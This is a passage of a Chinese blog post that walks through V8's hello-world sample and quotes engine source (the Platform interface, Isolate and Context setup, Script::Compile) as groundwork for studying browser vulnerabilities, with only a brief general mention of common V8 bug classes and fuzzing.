    <content type="html"><![CDATA[<blockquote><p>人总是会变的，以前我想变成风去推动风车，现在我想等风起。——大蛇丸</p></blockquote><h2 id="我为什么要学习v8源码"><a href="#我为什么要学习v8源码" class="headerlink" title="我为什么要学习v8源码"></a>我为什么要学习v8源码</h2><p>v8源码这个坑，给人感觉可能只有前端大佬会去趟，我这种前端只会写两句半的猹猹为什么要学习，因为我最近在学习又好搭环境又好利用的浏览器漏洞，目前fuzz无从fuzz，甚至漏洞点原理结合poc都看不太懂，我觉得原理是没有搂一遍v8源码，熟悉一下。</p><h3 id="常见v8漏洞点产生原因"><a href="#常见v8漏洞点产生原因" class="headerlink" title="常见v8漏洞点产生原因"></a>常见v8漏洞点产生原因</h3><ul><li>遍历优化过程中信息不匹配造成的类型混淆</li><li>优化过程中变量范围或者啥的计算错误</li><li>（不会了</li></ul><p>可见不像c的漏洞那种，用了个realloc，double free了，或者条件竞争什么的容易看出，这种漏洞点要懂编译器。</p><h3 id="用libfuzzer-fuzz-v8"><a href="#用libfuzzer-fuzz-v8" class="headerlink" title="用libfuzzer fuzz v8"></a>用libfuzzer fuzz v8</h3><p><a href="https://yq.aliyun.com/articles/215709" target="_blank" rel="noopener">https://yq.aliyun.com/articles/215709</a></p><p>总之就是v8自带fuzzer的，去fuzz就行了，可是这个fuzz怎么写的，原理怎么，我现在并不清楚，要fuzz的点也不清楚。</p><h2 id="samples-hello-world-cc"><a href="#samples-hello-world-cc" class="headerlink" title="samples/hello-world.cc"></a>samples/hello-world.cc</h2><h3 id="初始化阶段"><a href="#初始化阶段" class="headerlink" title="初始化阶段"></a>初始化阶段</h3><p>v8代码中有一些样例，首先通过这个<code>hello-world.cc</code>来看一下这整体编译流程。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">  <span class="comment">// Initialize V8.</span></span><br><span class="line">  v8::V8::InitializeICUDefaultLocation(argv[<span class="number">0</span>]);</span><br><span class="line">  v8::V8::InitializeExternalStartupData(argv[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;v8::Platform&gt; platform = v8::platform::NewDefaultPlatform();</span><br><span class="line">  v8::V8::InitializePlatform(platform.get());</span><br><span class="line">  v8::V8::Initialize();</span><br></pre></td></tr></table></figure><ul><li>v8::V8::InitializeICUDefaultLocation(argv[0]);</li></ul><p>ICU听起来像996icu，但是它并不是那个缩写，它是一个国际化的库。</p><blockquote><p>What is ICU?<br>ICU is a cross-platform Unicode based globalization library. It includes support for locale-sensitive string comparison, date/time/number/currency/message formatting, text boundary detection, character set conversion and so on.You can build V8 without ICU library with build option i18nsupport=off. In this case you need to initialize builtin ICU:<br>v8::V8::InitializeICU();</p></blockquote><ul><li>v8::V8::InitializeExternalStartupData(argv[0]);</li></ul><p>判断了有无这个宏<code>V8_USE_EXTERNAL_STARTUP_DATA</code>，如果有，初始化<code>snapshot</code>.</p><ul><li>std::unique_ptr<a href="v8::Platform" target="_blank" rel="noopener">v8::Platform</a> platform = v8::platform::NewDefaultPlatform();</li></ul><p>然后创建一个platform，从它的接口大致能看出他是干嘛的，用来管理isolate，管理线程池等：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * V8 Platform abstraction layer.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The embedder has to provide an implementation of this interface before</span></span><br><span class="line"><span class="comment"> * initializing the rest of V8.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Platform</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="keyword">virtual</span> ~Platform() = <span class="keyword">default</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * Allows the embedder to manage memory page allocations.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> PageAllocator* <span class="title">GetPageAllocator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// TODO(bbudge) Make this abstract after all embedders implement this.</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * Enables the embedder to respond in cases where V8 can't allocate large</span></span><br><span class="line"><span class="comment">   * blocks of memory. V8 retries the failed allocation once after calling this</span></span><br><span class="line"><span class="comment">   * method. On success, execution continues; otherwise V8 exits with a fatal</span></span><br><span class="line"><span class="comment">   * error.</span></span><br><span class="line"><span class="comment">   * Embedder overrides of this function must NOT call back into V8.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">OnCriticalMemoryPressure</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// TODO(bbudge) Remove this when embedders override the following method.</span></span><br><span class="line">    <span class="comment">// See crbug.com/634547.</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * Enables the embedder to respond in cases where V8 can't allocate large</span></span><br><span class="line"><span class="comment">   * memory regions. The |length| parameter is the amount of memory needed.</span></span><br><span class="line"><span class="comment">   * Returns true if memory is now available. Returns false if no memory could</span></span><br><span class="line"><span class="comment">   * be made available. V8 will retry allocations until this method returns</span></span><br><span class="line"><span class="comment">   * false.</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   * Embedder overrides of this function must NOT call back into V8.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="keyword">bool</span> <span class="title">OnCriticalMemoryPressure</span><span class="params">(<span class="keyword">size_t</span> length)</span> </span>&#123; <span class="keyword">return</span> <span class="literal">false</span>; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * Gets the number of worker threads used by</span></span><br><span class="line"><span class="comment">   * Call(BlockingTask)OnWorkerThread(). This can be used to estimate the number</span></span><br><span class="line"><span class="comment">   * of tasks a work package should be split into. A return value of 0 means</span></span><br><span class="line"><span class="comment">   * that there are no worker threads available. Note that a value of 0 won't</span></span><br><span class="line"><span class="comment">   * prohibit V8 from posting tasks using |CallOnWorkerThread|.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="keyword">int</span> <span class="title">NumberOfWorkerThreads</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * Returns a TaskRunner which can be used to post a task on the foreground.</span></span><br><span class="line"><span class="comment">   * The TaskRunner's NonNestableTasksEnabled() must be true. This function</span></span><br><span class="line"><span class="comment">   * should only be called from a foreground thread.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">virtual</span> <span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;v8::TaskRunner&gt; GetForegroundTaskRunner(</span><br><span class="line">      Isolate* isolate) = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * Schedules a task to be invoked on a worker thread.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">CallOnWorkerThread</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;Task&gt; task)</span> </span>= <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * Schedules a task that blocks the main thread to be invoked with</span></span><br><span class="line"><span class="comment">   * high-priority on a worker thread.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">CallBlockingTaskOnWorkerThread</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;Task&gt; task)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Embedders may optionally override this to process these tasks in a high</span></span><br><span class="line">    <span class="comment">// priority pool.</span></span><br><span class="line">    CallOnWorkerThread(<span class="built_in">std</span>::move(task));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * Schedules a task to be invoked with low-priority on a worker thread.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">CallLowPriorityTaskOnWorkerThread</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;Task&gt; task)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Embedders may optionally override this to process these tasks in a low</span></span><br><span class="line">    <span class="comment">// priority pool.</span></span><br><span class="line">    CallOnWorkerThread(<span class="built_in">std</span>::move(task));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * Schedules a task to be invoked on a worker thread after |delay_in_seconds|</span></span><br><span class="line"><span class="comment">   * expires.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">CallDelayedOnWorkerThread</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;Task&gt; task,</span></span></span><br><span class="line"><span class="function"><span class="params">                                         <span class="keyword">double</span> delay_in_seconds)</span> </span>= <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * Returns true if idle tasks are enabled for the given |isolate|.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="keyword">bool</span> <span class="title">IdleTasksEnabled</span><span class="params">(Isolate* isolate)</span> </span>&#123; <span class="keyword">return</span> <span class="literal">false</span>; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * Posts |job_task| to run in parallel. Returns a JobHandle associated with</span></span><br><span class="line"><span class="comment">   * the Job, which can be joined or canceled.</span></span><br><span class="line"><span class="comment">   * This avoids degenerate cases:</span></span><br><span class="line"><span class="comment">   * - Calling CallOnWorkerThread() for each work item, causing significant</span></span><br><span class="line"><span class="comment">   *   overhead.</span></span><br><span class="line"><span class="comment">   * - Fixed number of CallOnWorkerThread() calls that split the work and might</span></span><br><span class="line"><span class="comment">   *   run for a long time. This is problematic when many components post</span></span><br><span class="line"><span class="comment">   *   "num cores" tasks and all expect to use all the cores. In these cases,</span></span><br><span class="line"><span class="comment">   *   the scheduler lacks context to be fair to multiple same-priority requests</span></span><br><span class="line"><span class="comment">   *   and/or ability to request lower priority work to yield when high priority</span></span><br><span class="line"><span class="comment">   *   work comes in.</span></span><br><span class="line"><span class="comment">   * A canonical implementation of |job_task| looks like:</span></span><br><span class="line"><span class="comment">   * class MyJobTask : public JobTask &#123;</span></span><br><span class="line"><span class="comment">   *  public:</span></span><br><span class="line"><span class="comment">   *   MyJobTask(...) : worker_queue_(...) &#123;&#125;</span></span><br><span class="line"><span class="comment">   *   // JobTask:</span></span><br><span class="line"><span class="comment">   *   void Run(JobDelegate* delegate) override &#123;</span></span><br><span class="line"><span class="comment">   *     while (!delegate-&gt;ShouldYield()) &#123;</span></span><br><span class="line"><span class="comment">   *       // Smallest unit of work.</span></span><br><span class="line"><span class="comment">   *       auto work_item = worker_queue_.TakeWorkItem(); // Thread safe.</span></span><br><span class="line"><span class="comment">   *       if (!work_item) return;</span></span><br><span class="line"><span class="comment">   *       ProcessWork(work_item);</span></span><br><span class="line"><span class="comment">   *     &#125;</span></span><br><span class="line"><span class="comment">   *   &#125;</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   *   size_t GetMaxConcurrency() const override &#123;</span></span><br><span class="line"><span class="comment">   *     return worker_queue_.GetSize(); // Thread safe.</span></span><br><span class="line"><span class="comment">   *   &#125;</span></span><br><span class="line"><span class="comment">   * &#125;;</span></span><br><span class="line"><span class="comment">   * auto handle = PostJob(TaskPriority::kUserVisible,</span></span><br><span class="line"><span class="comment">   *                       std::make_unique&lt;MyJobTask&gt;(...));</span></span><br><span class="line"><span class="comment">   * handle-&gt;Join();</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   * PostJob() and methods of the returned JobHandle/JobDelegate, must never be</span></span><br><span class="line"><span class="comment">   * called while holding a lock that could be acquired by JobTask::Run or</span></span><br><span class="line"><span class="comment">   * JobTask::GetMaxConcurrency -- that could result in a deadlock. This is</span></span><br><span class="line"><span class="comment">   * because [1] JobTask::GetMaxConcurrency may be invoked while holding</span></span><br><span class="line"><span class="comment">   * internal lock (A), hence JobTask::GetMaxConcurrency can only use a lock (B)</span></span><br><span class="line"><span class="comment">   * if that lock is *never* held while calling back into JobHandle from any</span></span><br><span class="line"><span class="comment">   * thread (A=&gt;B/B=&gt;A deadlock) and [2] JobTask::Run or</span></span><br><span class="line"><span class="comment">   * JobTask::GetMaxConcurrency may be invoked synchronously from JobHandle</span></span><br><span class="line"><span class="comment">   * (B=&gt;JobHandle::foo=&gt;B deadlock).</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   * A sufficient PostJob() implementation that uses the default Job provided in</span></span><br><span class="line"><span class="comment">   * libplatform looks like:</span></span><br><span class="line"><span class="comment">   *  std::unique_ptr&lt;JobHandle&gt; PostJob(</span></span><br><span class="line"><span class="comment">   *      TaskPriority priority, std::unique_ptr&lt;JobTask&gt; job_task) override &#123;</span></span><br><span class="line"><span class="comment">   *    return std::make_unique&lt;DefaultJobHandle&gt;(</span></span><br><span class="line"><span class="comment">   *        std::make_shared&lt;DefaultJobState&gt;(</span></span><br><span class="line"><span class="comment">   *            this, std::move(job_task), kNumThreads));</span></span><br><span class="line"><span class="comment">   * &#125;</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">virtual</span> <span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;JobHandle&gt; PostJob(</span><br><span class="line">      TaskPriority priority, <span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;JobTask&gt; job_task) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * Monotonically increasing time in seconds from an arbitrary fixed point in</span></span><br><span class="line"><span class="comment">   * the past. This function is expected to return at least</span></span><br><span class="line"><span class="comment">   * millisecond-precision values. For this reason,</span></span><br><span class="line"><span class="comment">   * it is recommended that the fixed point be no further in the past than</span></span><br><span class="line"><span class="comment">   * the epoch.</span></span><br><span class="line"><span class="comment">   **/</span></span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="keyword">double</span> <span class="title">MonotonicallyIncreasingTime</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * Current wall-clock time in milliseconds since epoch.</span></span><br><span class="line"><span class="comment">   * This function is expected to return at least millisecond-precision values.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="keyword">double</span> <span class="title">CurrentClockTimeMillis</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*StackTracePrinter)</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * Returns a function pointer that print a stack trace of the current stack</span></span><br><span class="line"><span class="comment">   * on invocation. Disables printing of the stack trace if nullptr.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> StackTracePrinter <span class="title">GetStackTracePrinter</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="literal">nullptr</span>; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * Returns an instance of a v8::TracingController. This must be non-nullptr.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> TracingController* <span class="title">GetTracingController</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * Tells the embedder to generate and upload a crashdump during an unexpected</span></span><br><span class="line"><span class="comment">   * but non-critical scenario.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">DumpWithoutCrashing</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">protected</span>:</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * Default implementation of current wall-clock time in milliseconds</span></span><br><span class="line"><span class="comment">   * since epoch. Useful for implementing |CurrentClockTimeMillis| if</span></span><br><span class="line"><span class="comment">   * nothing special needed.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function">V8_EXPORT <span class="keyword">static</span> <span class="keyword">double</span> <span class="title">SystemClockTimeMillis</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#125;  <span class="comment">// namespace v8</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  <span class="comment">// V8_V8_PLATFORM_H_</span></span></span><br></pre></td></tr></table></figure><ul><li>v8::V8::InitializePlatform(platform.get());</li></ul><p>见名知义，是初始化platform的。</p><ul><li>v8::V8::Initialize();</li></ul><p>包含着递归很多层的Initialize。。</p><h3 id="Create-a-new-Isolate-and-make-it-the-current-one"><a href="#Create-a-new-Isolate-and-make-it-the-current-one" class="headerlink" title="Create a new Isolate and make it the current one"></a>Create a new Isolate and make it the current one</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Create a new Isolate and make it the current one.</span></span><br><span class="line">v8::Isolate::CreateParams create_params;</span><br><span class="line">create_params.array_buffer_allocator =</span><br><span class="line">    v8::ArrayBuffer::Allocator::NewDefaultAllocator();</span><br><span class="line">v8::Isolate* isolate = v8::Isolate::New(create_params);</span><br></pre></td></tr></table></figure><p>用create_params为参数创建一个isolate；设置数组分配器<code>array_buffer_allocator</code>；然后创建一个单独的v8引擎实例，isolate有完全独立的状态，对象在isolate之间不能共享。我们可以创建多个isolate，然后再不同的线程中使用。isolate在一个时刻只能由一个线程执行，多线程时必须加锁保证同步。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v8::Isolate::<span class="function">Scope <span class="title">isolate_scope</span><span class="params">(isolate)</span></span>;</span><br></pre></td></tr></table></figure><p>创建isolate的一个范围，用来给每个引擎设置一个单独执行的环境。该对象只能在栈上分配。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Create a stack-allocated handle scope.</span></span><br><span class="line">v8::<span class="function">HandleScope <span class="title">handle_scope</span><span class="params">(isolate)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create a new context.</span></span><br><span class="line">v8::Local&lt;v8::Context&gt; context = v8::Context::New(isolate);</span><br></pre></td></tr></table></figure><p>这一段解释一下handle和context的概念。</p><p>context可以理解为上下文，一个有自己内置函数和对象的执行环境，因为JavaScript非常动态，所以可能会有很多执行环境，context可以嵌套，我们可以从一个context进入另一个context，然后再退出。</p><p>handle是用来管理context的，我们也可以直接指针持有context，但是v8同时也在管理context，所以为了方便加了一层抽象层用handle来管理context，我们就不用管v8如何去处理这些内存了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Enter the context for compiling and running the hello world script.</span></span><br><span class="line">v8::Context::<span class="function">Scope <span class="title">context_scope</span><span class="params">(context)</span></span>;</span><br></pre></td></tr></table></figure><p>这个看起来是要进入当前跑hello world的执行环境。</p><h3 id="编译执行代码"><a href="#编译执行代码" class="headerlink" title="编译执行代码"></a>编译执行代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Create a string containing the JavaScript source code.</span></span><br><span class="line">    v8::Local&lt;v8::String&gt; source =</span><br><span class="line">        v8::String::NewFromUtf8Literal(isolate, <span class="string">"'Hello' + ', World!'"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Compile the source code.</span></span><br><span class="line">    v8::Local&lt;v8::Script&gt; script =</span><br><span class="line">        v8::Script::Compile(context, source).ToLocalChecked();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Run the script to get the result.</span></span><br><span class="line">    v8::Local&lt;v8::Value&gt; result = script-&gt;Run(context).ToLocalChecked();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Convert the result to an UTF8 string and print it.</span></span><br><span class="line">    v8::String::<span class="function">Utf8Value <span class="title">utf8</span><span class="params">(isolate, result)</span></span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, *utf8);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段是先创建一段源代码，就是<code>&#39;hello&#39; + &#39;, world&#39;</code>；然后compile，然后run，最后把结果输出到屏幕上。</p><h4 id="细看一下v8-Script-Compile"><a href="#细看一下v8-Script-Compile" class="headerlink" title="细看一下v8::Script::Compile()"></a>细看一下<code>v8::Script::Compile()</code></h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ScriptCompiler::<span class="function">Source <span class="title">script_source</span><span class="params">(source)</span></span>;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">ScriptCompiler::Source::Source(Local&lt;String&gt; <span class="built_in">string</span>,</span><br><span class="line">                               CachedData* data)</span><br><span class="line">    : source_string(<span class="built_in">string</span>), cached_data(data) &#123;&#125;</span><br></pre></td></tr></table></figure><p>可以看到这两句话，首先创建了Source，然后调用了下面那个函数，其中很两个参数都是默认值，<code>kNoCompileOptions</code>和<code>kNoCacheNoReason</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">MaybeLocal&lt;Script&gt; ScriptCompiler::Compile(Local&lt;Context&gt; context,</span><br><span class="line">                                           Source* source,</span><br><span class="line">                                           CompileOptions options,</span><br><span class="line">                                           NoCacheReason no_cache_reason) &#123;</span><br><span class="line">  Utils::ApiCheck(</span><br><span class="line">      !source-&gt;GetResourceOptions().IsModule(), <span class="string">"v8::ScriptCompiler::Compile"</span>,</span><br><span class="line">      <span class="string">"v8::ScriptCompiler::CompileModule must be used to compile modules"</span>);</span><br><span class="line">  <span class="keyword">auto</span> isolate = context-&gt;GetIsolate();</span><br><span class="line">  <span class="keyword">auto</span> maybe =</span><br><span class="line">      CompileUnboundInternal(isolate, source, options, no_cache_reason);</span><br><span class="line">  Local&lt;UnboundScript&gt; result;</span><br><span class="line">  <span class="keyword">if</span> (!maybe.ToLocal(&amp;result)) <span class="keyword">return</span> MaybeLocal&lt;Script&gt;();</span><br><span class="line">  v8::Context::<span class="function">Scope <span class="title">scope</span><span class="params">(context)</span></span>;</span><br><span class="line">  <span class="keyword">return</span> result-&gt;BindToCurrentContext();</span><br><span 